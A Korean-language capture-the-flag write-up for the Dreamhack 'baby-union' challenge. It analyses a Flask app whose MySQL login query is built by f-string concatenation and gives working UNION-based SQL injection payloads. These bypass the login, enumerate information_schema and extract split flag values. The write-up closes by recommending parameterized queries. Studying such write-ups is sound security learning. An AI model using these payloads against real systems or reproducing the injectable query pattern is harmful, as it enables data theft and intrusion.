# baby-union

[문제 링크](https://dreamhack.io/wargame/challenges/984)

## 문제 분석

이 문제는 사용자의 아이디(`uid`)와 비밀번호(`upw`)를 입력받아 MySQL 데이터베이스에서 계정 정보를 조회하고, 일치하는 레코드가 존재할 경우 화면에 출력하는 웹 애플리케이션입니다. 데이터베이스 내부에는 기본 계정 테이블 외에 플래그가 저장된 별도의 테이블이 존재하며, 테이블명과 컬럼명은 임의의 문자열로 설정되어 있습니다.

제공된 백엔드 애플리케이션(`app.py`)의 주요 라우트 코드는 다음과 같습니다.

```python
@app.route("/", methods=["GET", "POST"])
def index():
    if request.method == "POST":
        uid = request.form.get("uid", "")
        upw = request.form.get("upw", "")
        
        if uid and upw:
            cur = mysql.connection.cursor()
            cur.execute(f"SELECT * FROM users WHERE uid='{uid}' and upw='{upw}';")

            data = cur.fetchall()
            if data:
                return render_template("user.html", data=data)
            else:
                return render_template("index.html", data="Wrong")

        return render_template("index.html", data="Fill the input box", pre=1)
    return render_template("index.html")
```

서버는 `uid`와 `upw`가 모두 입력되었는지 확인한 후, 파이썬의 f-string 포매팅을 사용해 `SELECT` 쿼리문을 생성하고 실행합니다. 쿼리 실행 결과(`data`)가 존재하면 `user.html` 템플릿을 통해 각 행의 특정 컬럼 값을 테이블 형태로 화면에 출력합니다.

---

## 취약점 분석

### 1. 문자열 직접 결합으로 인한 SQL Injection

문제가 발생하는 지점은 데이터베이스 쿼리를 실행하는 다음 코드입니다.

```python
cur.execute(f"SELECT * FROM users WHERE uid='{uid}' and upw='{upw}';")
```

입력값에 포함된 작은따옴표(`'`)나 주석 기호(`-- `, `#`)에 대한 검증 없이 문자열 결합 방식으로 쿼리를 구성하므로, 공격자가 `uid` 또는 `upw` 입력란에 SQL 구문을 주입하여 쿼리의 구조를 변경할 수 있습니다.

예를 들어 `uid`에 `' -- `를 입력하고 `upw`에 임의의 값을 전달하면, 백엔드에서 실행되는 쿼리는 다음과 같이 변조됩니다.

```sql
SELECT * FROM users WHERE uid='' -- ' and upw='1234';
```

위 쿼리나 주석 앞에 참 조건(`' OR 1=1 -- `)을 결합한 쿼리를 실행하면 비밀번호 검증 조건(`and upw='{upw}'`)이 무효화되면서 `users` 테이블의 레코드가 반환됩니다.

| # | id | description |
|---|---|---|
| 1 | admin | For admin |
| 2 | guest | For guest |
| 3 | banana | For banana |

출력된 결과를 확인하면 `users` 테이블은 총 4개의 컬럼(`idx`, `uid`, `upw`, `descr`)으로 구성되어 있으며, 이 중 비밀번호에 해당하는 3번째 컬럼(`upw`)을 제외한 1번째(`#`), 2번째(`id`), 4번째(`description`) 컬럼만 화면에 렌더링되는 구조를 가집니다.

### 2. UNION 연산자를 이용한 메타데이터 및 타 테이블 조회

쿼리 실행 결과가 웹 페이지에 직접 출력되므로, 기존 `SELECT` 문의 결과 집합에 새로운 `SELECT` 문의 결과 집합을 결합하는 `UNION` 기반 SQL Injection을 수행할 수 있습니다.

`UNION` 연산자를 사용할 때는 선행 쿼리(`SELECT * FROM users`)의 컬럼 개수인 4개에 맞춰 후행 `SELECT` 문의 컬럼 개수를 4개로 지정해야 합니다. 또한 화면에 값이 출력되는 위치인 1번째, 2번째, 4번째 컬럼 자리에 조회할 대상 컬럼을 배치하고, 화면에 출력되지 않는 3번째 컬럼 자리에는 `NULL`을 채워 넣으면 원하는 데이터를 화면에서 확인할 수 있습니다.

MySQL의 기본 시스템 데이터베이스인 `information_schema`의 `tables` 뷰와 `columns` 뷰를 순서대로 조회하면 숨겨진 테이블명과 컬럼명을 파악할 수 있습니다.

---

## 익스플로잇

`if uid and upw:` 조건문을 통과해야 쿼리가 실행되므로, 모든 요청 시 `upw` 입력란에는 임의의 문자열(예: `1`)을 함께 입력하고 `uid` 입력란에 페이로드를 전달합니다.

### 1. 테이블 목록 조회 (`information_schema.tables`)

현재 데이터베이스에 존재하는 테이블 이름을 확인하기 위해 `information_schema.tables`의 `table_name` 컬럼을 2번째 출력 위치(`id` 열)에 배치하여 조회합니다.

```sql
-- 4개의 컬럼 개수를 맞추고, 2번째 컬럼 자리에 테이블명을 매핑함
' UNION SELECT null, table_name, null, null FROM information_schema.tables #
```

출력된 테이블 목록을 확인하면 기본 `users` 테이블 외에 플래그가 저장된 `onlyflag` 테이블을 확인할 수 있습니다.

### 2. `onlyflag` 테이블의 컬럼 목록 조회 (`information_schema.columns`)

확인한 `onlyflag` 테이블 내부에 어떤 컬럼이 존재하는지 파악하기 위해 `information_schema.columns`에서 `table_name='onlyflag'` 조건으로 `column_name`을 조회합니다.

```sql
' UNION SELECT column_name, null, null, null FROM information_schema.columns WHERE table_name='onlyflag' -- 
```

조회 결과를 통해 `onlyflag` 테이블에는 `idx`, `sname`, `svalue`, `sflag`, `sclose` 등 총 5개의 컬럼이 존재하는 것을 확인할 수 있습니다.

### 3. 플래그 데이터 추출

`onlyflag` 테이블의 컬럼 중 플래그 문자열 조각이 나누어 저장된 `svalue`, `sflag`, `sclose` 컬럼을 조회합니다. 앞서 분석한 대로 `user.html` 템플릿은 조회 결과의 1번째, 2번째, 4번째 컬럼만 화면에 출력하고 3번째 컬럼은 출력하지 않으므로, 3번째 위치에는 `null`을 배치하고 나머지 위치에 세 컬럼을 배치합니다.

```sql
-- 화면에 출력되는 1, 2, 4번째 컬럼 위치에 svalue, sflag, sclose를 배치하여 한 번에 조회함
' UNION SELECT svalue, sflag, null, sclose FROM onlyflag #
```

위 페이로드를 전송하면 화면의 `#`, `id`, `description` 열에 각각 `svalue`, `sflag`, `sclose` 컬럼의 데이터가 출력되며, 분할된 문자열을 순서대로 이어 붙여 전체 플래그를 획득할 수 있습니다.

---

## 결론

이 문제는 사용자 입력값을 문자열 포매팅으로 SQL 쿼리에 직접 결합할 때 발생하는 UNION 기반 SQL Injection 취약점을 다룹니다.

이와 같은 SQL Injection을 방지하기 위해서는 사용자 입력값을 쿼리 문자열에 직접 연결하지 않고, 데이터베이스 드라이버가 제공하는 Prepared Statement(Parameterized Query) 방식을 적용해야 합니다. 파라미터 바인딩을 사용하면 입력값에 작은따옴표나 `UNION` 같은 SQL 예약어가 포함되더라도 데이터베이스 엔진이 이를 실행 가능한 명령어가 아닌 단순 문자열 리터럴 데이터로만 처리하므로 쿼리 구조 변조를 원천적으로 차단할 수 있습니다.
